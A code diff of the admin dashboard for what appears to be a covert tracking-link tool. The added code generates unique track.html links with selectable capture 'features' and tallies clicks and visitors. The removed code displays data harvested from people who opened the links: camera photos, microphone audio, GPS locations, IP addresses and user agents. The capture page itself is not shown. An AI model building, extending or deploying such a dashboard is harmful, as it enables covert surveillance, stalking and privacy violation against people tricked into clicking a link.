+            item.addEventListener('click', function() {
+                const feature = this.getAttribute('data-feature');
+                
+                if(feature === 'basic') return; // Basic always selected
+                
+                if(selectedFeatures.has(feature)) {
+                    selectedFeatures.delete(feature);
+                    this.classList.remove('selected');
+                } else {
+                    selectedFeatures.add(feature);
+                    this.classList.add('selected');
+                }
             });
         });
-    }
-
-    // ========== DATA VIEWER: show clicks list and captured media ==========
-    async function loadDataLinks() {
-        const linksRef = db.ref(`links/${adminUid}`);
-        linksRef.on('value', (snapshot) => {
-            const links = snapshot.val();
-            const container = document.getElementById('dataLinksList');
-            if (!links) { container.innerHTML = '<div class="data-card">এখনো কোনো লিংক নেই।</div>'; return; }
-            let html = '';
-            for (let id in links) {
-                html += `<div class="link-card" data-linkid="${id}">
-                            <strong>🔗 ${id}</strong><br>
-                            তৈরি: ${new Date(links[id].createdAt).toLocaleString()}
-                         </div>`;
-            }
-            container.innerHTML = html;
-            document.querySelectorAll('[data-linkid]').forEach(el => {
-                el.addEventListener('click', () => showLinkData(el.getAttribute('data-linkid')));
-            });
-        });
-    }
-
-    async function showLinkData(linkId) {
-        const detailsDiv = document.getElementById('dataDetails');
-        detailsDiv.classList.remove('hide');
-        document.getElementById('selectedLinkId').innerText = linkId;
-        const mediaDiv = document.getElementById('mediaList');
-        mediaDiv.innerHTML = '<div class="loader"></div><p>ডাটা লোড হচ্ছে...</p>';
-
-        const trackRef = db.ref(`captured_data/${adminUid}/${linkId}`);
-        trackRef.once('value', (snapshot) => {
-            const data = snapshot.val();
-            if (!data) {
-                mediaDiv.innerHTML = '<p>এখনো কোনো ডাটা ক্যাপচার হয়নি।</p>';
+        
+        // ========== LINK GENERATION ==========
+        document.getElementById('generateBtn').addEventListener('click', generateLink);
+        
+        async function generateLink() {
+            if(!currentUID) {
+                showNotification('Please wait, UID not ready', 'error');
                 return;
             }
-            let photos = [], audios = [], locations = [], clicks = [], others = [];
-            for (let key in data) {
-                const entry = data[key];
-                if (key.startsWith('camera_photo')) photos.push(entry);
-                else if (key.startsWith('microphone_audio')) audios.push(entry);
-                else if (key.startsWith('location')) locations.push(entry);
-                else if (key.startsWith('click_')) clicks.push(entry);
-                else others.push(entry);
+            
+            const loadingDiv = document.getElementById('loadingDiv');
+            const linkResult = document.getElementById('linkResult');
+            const generateBtn = document.getElementById('generateBtn');
+            
+            loadingDiv.classList.add('show');
+            linkResult.classList.remove('show');
+            generateBtn.disabled = true;
+            
+            try {
+                // Generate unique link ID
+                const linkId = 'LINK_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
+                
+                // Get base URL
+                let baseUrl = window.location.href.replace('admin.html', 'track.html');
+                if(!baseUrl.includes('track.html')) {
+                    baseUrl = window.location.origin + '/track.html';
+                }
+                
+                // Build features array
+                const features = Array.from(selectedFeatures);
+                
+                // Save to Firebase
+                const linkData = {
+                    createdAt: firebase.database.ServerValue.TIMESTAMP,
+                    features: features,
+                    clicks: 0,
+                    visitors: {}
+                };
+                
+                await database.ref('admins/' + currentUID + '/links/' + linkId).set(linkData);
+                
+                // Update total links count
+                const adminRef = database.ref('admins/' + currentUID);
+                await adminRef.update({
+                    totalLinks: firebase.database.ServerValue.increment(1)
+                });
+                
+                // Generate URL
+                const params = new URLSearchParams({
+                    admin: currentUID,
+                    link: linkId,
+                    f: features.join(',')
+                });
+                
+                generatedLinkURL = baseUrl + '?' + params.toString();
+                
+                // Display
+                document.getElementById('generatedLink').textContent = generatedLinkURL;
+                
+                loadingDiv.classList.remove('show');
+                linkResult.classList.add('show');
+                generateBtn.disabled = false;
+                
+                showNotification('Link Generated Successfully!', 'success');
+                
+                // Reload links list
+                loadAdminData();
+                
+            } catch(error) {
+                console.error('Error:', error);
+                showNotification('Error generating link: ' + error.message, 'error');
+                loadingDiv.classList.remove('show');
+                generateBtn.disabled = false;
             }
-            let html = `<h4>👆 ক্লিক তথ্য (${clicks.length})</h4>`;
-            clicks.sort((a,b) => b.timestamp - a.timestamp);
-            clicks.forEach(c => {
-                const time = new Date(c.timestamp).toLocaleString();
-                const ip = c.data.ip || 'unknown';
-                const ua = c.data.userAgent || '';
-                html += `<div class="click-entry"><strong>${time}</strong> | IP: ${ip}<br><small>${ua.substring(0, 100)}</small></div>`;
+        }
+        
+        // ========== LOAD ADMIN DATA ==========
+        async function loadAdminData() {
+            if(!currentUID) return;
+            
+            try {
+                const snapshot = await database.ref('admins/' + currentUID).once('value');
+                const data = snapshot.val() || {};
+                
+                // Update stats
+                document.getElementById('totalLinks').textContent = data.totalLinks || 0;
+                
+                let totalClicks = 0;
+                let totalVisitors = 0;
+                
+                // Load links
+                const linksList = document.getElementById('linksList');
+                linksList.innerHTML = '';
+                
+                if(data.links) {
+                    const linksArray = Object.entries(data.links).reverse();
+                    
+                    linksArray.forEach(([linkId, linkData]) => {
+                        totalClicks += linkData.clicks || 0;
+                        
+                        const visitorCount = linkData.visitors ? Object.keys(linkData.visitors).length : 0;
+                        totalVisitors += visitorCount;
+                        
+                        const linkItem = document.createElement('div');
+                        linkItem.className = 'link-item';
+                        
+                        const optionsHtml = linkData.features.map(f => 
+                            `<span class="option-tag">${f.toUpperCase()}</span>`
+                        ).join('');
+                        
+                        linkItem.innerHTML = `
+                            <div class="link-id">${linkId}</div>
+                            <div class="link-options">${optionsHtml}</div>
+                            <div class="link-stats">
+                                <div class="stat">Clicks: <span class="stat-value">${linkData.clicks || 0}</span></div>
+                                <div class="stat">Visitors: <span class="stat-value">${visitorCount}</span></div>
+                                <div class="stat">Created: <span class="stat-value">${new Date(linkData.createdAt).toLocaleDateString()}</span></div>
+                            </div>
+                        `;
+                        
+                        linksList.appendChild(linkItem);
+                    });
+                } else {
+                    linksList.innerHTML = `
+                        <div style="text-align: center; color: rgba(255,215,0,0.5); padding: 30px;">
+                            No links generated yet...
+                        </div>
+                    `;
+                }
+                
+                document.getElementById('totalClicks').textContent = totalClicks;
+                document.getElementById('totalVisitors').textContent = totalVisitors;
+                
+            } catch(error) {
+                console.error('Error loading data:', error);
+            }
+        }
+        
+        // ========== UTILITY FUNCTIONS ==========
+        function copyLink() {
+            if(!generatedLinkURL) return;
+            
+            navigator.clipboard.writeText(generatedLinkURL).then(() => {
+                showNotification('Link copied to clipboard!', 'success');
+            }).catch(() => {
+                showNotification('Failed to copy link', 'error');
             });
-            html += `<h4>📸 ছবি (${photos.length})</h4>`;
-            photos.forEach(p => {
-                const time = new Date(p.timestamp).toLocaleString();
-                html += `<div class="data-entry"><strong>${time}</strong><br><img src="${p.data.url}" style="max-width:100%; max-height:200px;"></div>`;
+        }
+        
+        function openLink() {
+            if(!generatedLinkURL) return;
+            window.open(generatedLinkURL, '_blank');
+        }
+        
+        function showNotification(message, type = 'info') {
+            const notif = document.getElementById('notification');
+            notif.textContent = message;
+            notif.className = 'notification ' + type;
+            notif.classList.add('show');
+            
+            setTimeout(() => {
+                notif.classList.remove('show');
+            }, 3000);
+        }
+        
+        // ========== REALTIME UPDATES ==========
+        function setupRealtimeUpdates() {
+            if(!currentUID) return;
+            
+            database.ref('admins/' + currentUID + '/links').on('value', (snapshot) => {
+                loadAdminData();
             });
-            html += `<h4>🎤 অডিও ক্লিপ (${audios.length})</h4>`;
-            audios.forEach(a => {
-                const time = new Date(a.timestamp).toLocaleString();
-                html += `<div class="data-entry"><strong>${time}</strong><br><audio controls src="${a.data.url}" style="width:100%;"></audio></div>`;
-            });
-            html += `<h4>📍 লোকেশন (${locations.length})</h4>`;
-            locations.forEach(loc => {
-                const time = new Date(loc.timestamp).toLocaleString();
-                html += `<div class="data-entry"><strong>${time}</strong><br>${loc.data.lat}, ${loc.data.lon}</div>`;
-            });
-            html += `<h4>📋 অন্যান্য তথ্য</h4>`;
-            others.forEach(o => {
-                const time = new Date(o.timestamp).toLocaleString();
-                html += `<div class="data-entry"><strong>${o.type}</strong> at ${time}<br><pre>${JSON.stringify(o.data, null, 2)}</pre></div>`;
-            });
-            mediaDiv.innerHTML = html;
+        }
+        
+        // ========== INITIALIZATION ==========
+        document.addEventListener('DOMContentLoaded', async () => {
+            await initializeUID();
+            setupRealtimeUpdates();
         });
-    }
-
-    init();
-</script>
+    </script>
 </body>
 </html>
